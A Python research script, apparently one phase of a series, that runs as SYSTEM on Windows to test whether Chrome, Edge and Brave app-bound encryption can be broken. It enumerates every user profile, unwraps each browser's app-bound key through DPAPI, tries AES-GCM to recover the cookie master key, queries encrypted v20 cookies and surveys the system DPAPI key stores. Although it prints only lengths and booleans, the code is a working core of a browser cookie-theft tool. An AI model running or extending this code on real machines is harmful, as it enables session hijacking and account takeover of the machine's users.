#!/usr/bin/env python3
"""Phase 6: the SYSTEM-context test.

Run ELEVATED and as SYSTEM (scheduled task with /ru SYSTEM, or psexec -s).
If the ABE wrap opens here, the whole v20 wall is an account-scope boundary,
not a TPM boundary.

Prints booleans, lengths and the install path only. No key bytes, no values.
"""
import base64
import ctypes
import ctypes.wintypes as wt
import hashlib
import json
import os
import sqlite3
import subprocess
import sys
from pathlib import Path

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

LOCAL = os.getenv("LOCALAPPDATA", "")
USERS_ROOT = Path(r"C:\Users")

crypt32 = ctypes.windll.crypt32
kernel32 = ctypes.windll.kernel32


class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]


def unprotect(blob: bytes):
    buf = ctypes.create_string_buffer(blob, len(blob))
    din = DATA_BLOB(len(blob), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    dout = DATA_BLOB()
    if not crypt32.CryptUnprotectData(
            ctypes.byref(din), None, None, None, None, 0, ctypes.byref(dout)):
        return None
    try:
        return ctypes.string_at(dout.pbData, dout.cbData)
    finally:
        kernel32.LocalFree(dout.pbData)


def whoami():
    try:
        return subprocess.run(["whoami", "/user"], capture_output=True, text=True,
                              timeout=20, errors="replace").stdout.strip()
    except Exception:
        return "?"


print("=" * 70)
print(" PHASE 6 — SYSTEM-context ABE unwrap")
print("=" * 70)
print(f"\n  identity: {whoami()}")

BROWSERS = {
    "Chrome": "/Google/Chrome/User Data",
    "Edge": "/Microsoft/Edge/User Data",
    "Brave": "/BraveSoftware/Brave-Browser/User Data",
}

candidates = []
if LOCAL:
    candidates.append(Path(LOCAL))
for u in USERS_ROOT.glob("*"):
    p = u / "AppData" / "Local"
    if p.is_dir():
        candidates.append(p)

print("\n[A] ABE UNWRAP FROM THIS CONTEXT")
for name, suffix in BROWSERS.items():
    for base in candidates:
        root = Path(str(base) + suffix)
        ls = root / "Local State"
        if not ls.is_file():
            continue
        try:
            j = json.loads(ls.read_text(encoding="utf-8", errors="replace"))
        except Exception:
            continue
        abe = (j.get("os_crypt") or {}).get("app_bound_encrypted_key")
        if not isinstance(abe, str):
            continue
        raw = base64.b64decode(abe)
        payload = unprotect(raw[4:]) if raw[:4] == b"APPB" else unprotect(raw)
        print(f"\n  {name}  ({base})")
        if payload is None:
            print("      unwrap: FAIL (still sealed)")
            continue
        print(f"      unwrap: OK -> {len(payload)} bytes")
        printable = "".join(chr(b) if 32 <= b < 127 else "." for b in payload[:120])
        print(f"      head ascii: {printable}")
        path_str = payload.split(b"\x00")[0]
        try:
            print(f"      embedded path: {path_str.decode('utf-8', 'replace')}")
        except Exception:
            pass

        # after <len><path> + 1 flag byte: 12-byte nonce, 32-byte key, 16-byte tag
        for skip in (0, 1, 2, 4):
            blen = payload[0]
            if 1 <= blen < 120 and len(payload) > blen + skip + 60:
                cand = payload[blen + skip:]
                if len(cand) == 60:
                    key = None
                    try:
                        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                        key = AESGCM(cand[12:44]).decrypt(cand[0:12], cand[44:60], None)
                    except Exception:
                        pass
                    print(f"      candidate key at skip={skip}: "
                          f"{'DECRYPT OK -> ' + str(len(key)) + ' bytes' if key else 'no'}")
                    break

        # if we got a key, prove it on one real cookie
        db = root / "Default" / "Network" / "Cookies"
        if db.is_file():
            try:
                con = sqlite3.connect(f"file:{db.as_posix()}?mode=ro", uri=True, timeout=3)
                rows = con.execute(
                    "SELECT host_key, encrypted_value FROM cookies "
                    "WHERE substr(encrypted_value,1,3)='v20' LIMIT 25").fetchall()
                print(f"      v20 cookie rows available: {len(rows)}")
                con.close()
            except Exception as e:
                print(f"      cookie db: {type(e).__name__}")

print("\n[B] SYSTEM MASTER KEY STORE")
for base in (r"C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Protect",
             r"C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Protect",
             r"C:\Windows\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Protect"):
    d = Path(base)
    if not d.is_dir():
        print(f"  {base}\n      absent")
        continue
    try:
        sids = list(d.iterdir())
        print(f"  {base}\n      {len(sids)} sid dir(s)")
        for s in sids:
            try:
                print(f"      {s.name}: {len(list(s.iterdir()))} key file(s)")
            except PermissionError:
                print(f"      {s.name}: denied")
    except PermissionError:
        print(f"  {base}\n      ACCESS DENIED")

print("\n" + "=" * 70)
